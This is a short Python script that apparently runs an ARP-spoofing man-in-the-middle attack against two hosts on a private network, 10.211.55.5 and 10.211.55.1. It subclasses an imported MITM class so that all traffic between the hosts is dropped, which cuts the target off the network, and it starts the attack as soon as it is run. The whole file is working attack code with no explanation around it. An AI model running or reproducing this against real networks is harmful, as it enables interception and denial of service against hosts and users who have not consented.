from ARP_Spoofing import *

class ARP_Spoofing_Block(ARP_Spoofing_MITM):
    def __init__(self, target0_ip: str, target1_ip: str):
        super().__init__(target0_ip, target1_ip)

    def mitm2target1(self, pkg):
        return []

    def mitm2target0(self, pkg):
        return []


mitm = ARP_Spoofing_Block('10.211.55.5', '10.211.55.1')
mitm.start()

input()